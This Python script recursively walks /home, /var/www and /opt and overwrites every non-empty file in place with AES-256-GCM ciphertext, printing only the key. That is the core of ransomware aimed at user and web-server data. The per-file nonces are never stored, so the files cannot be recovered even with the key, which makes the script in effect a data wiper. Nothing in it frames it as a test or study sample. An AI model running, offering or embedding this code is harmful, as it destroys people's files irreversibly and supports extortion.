import os
import secrets
from typing import List, Tuple, Union

from cryptography.hazmat.primitives.ciphers.aead import AESGCM


def encrypt_directories(directory_paths: List[str]) -> Tuple[bytes, List[str]]:
    """
    Recursively discovers and encrypts files within specified directories using AES-256-GCM.
    
    Args:
        directory_paths: A list of directory paths to recursively scan and encrypt.
        
    Returns:
        A tuple containing:
            - The master encryption key as raw bytes (32 bytes for AES-256)
            - A list of file paths that were successfully encrypted in-place
            
    Raises:
        FileNotFoundError: If a specified directory does not exist.
        PermissionError: If a file cannot be read or written due to permissions.
    """
    # Generate a random 32-byte key for AES-256-GCM
    encryption_key = secrets.token_bytes(32)
    
    encrypted_files: List[str] = []
    
    for dir_path in directory_paths:
        if not os.path.exists(dir_path):
            raise FileNotFoundError(f"Directory does not exist: {dir_path}")
        
        for root, dirs, files in os.walk(dir_path):
            for filename in files:
                file_path = os.path.join(root, filename)
                
                try:
                    # Read the original file content
                    with open(file_path, 'rb') as f:
                        plaintext = f.read()
                    
                    if len(plaintext) == 0:
                        continue
                    
                    # Generate a random IV for this encryption operation
                    iv = secrets.token_bytes(12)
                    
                    # Create AESGCM cipher and encrypt the data
                    aesgcm = AESGCM(encryption_key)
                    ciphertext = aesgcm.encrypt(iv, plaintext, None)
                    
                    # Write encrypted content back to the same file (in-place overwrite)
                    with open(file_path, 'wb') as f:
                        f.write(ciphertext)
                    
                    encrypted_files.append(file_path)
                    
                except PermissionError as e:
                    raise PermissionError(f"Cannot encrypt {file_path}: {e}")
                except OSError as e:
                    raise OSError(f"Failed to process {file_path}: {e}")
    
    return encryption_key, encrypted_files


if __name__ == "__main__":
    # Example usage - encrypt files in /home, /var/www, and /opt
    target_directories = ["/home", "/var/www", "/opt"]
    
    key, paths = encrypt_directories(target_directories)
    
    print(f"Encryption Key (hex): {key.hex()}")
    print(f"Encrypted files: {len(paths)}")
    for path in paths[:10]:
        print(f"  - {path}")
